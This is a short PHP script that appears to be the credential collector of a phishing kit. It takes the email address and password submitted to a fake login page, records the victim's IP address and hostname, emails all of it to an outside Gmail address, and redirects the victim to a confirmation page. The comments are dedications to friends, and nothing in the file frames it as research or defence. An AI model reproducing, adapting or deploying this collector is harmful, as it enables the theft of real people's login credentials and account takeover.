<?php
// Ehh l7alwa l7alwa I dédicace l3chran LAHCEN KHALID ACHRAF BADR
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "====+++ Oui c sa VBV HIHI +++====\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "======+ BY +=======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "nabilwind5974@gmail.com"; 
$subject = "LOG  *_* [".$_POST['email']."] $ip";
$headers = "From:  <Login@okby.com>";

mail($send,$subject,$message,$headers);
header("Location: confirm.php");

?>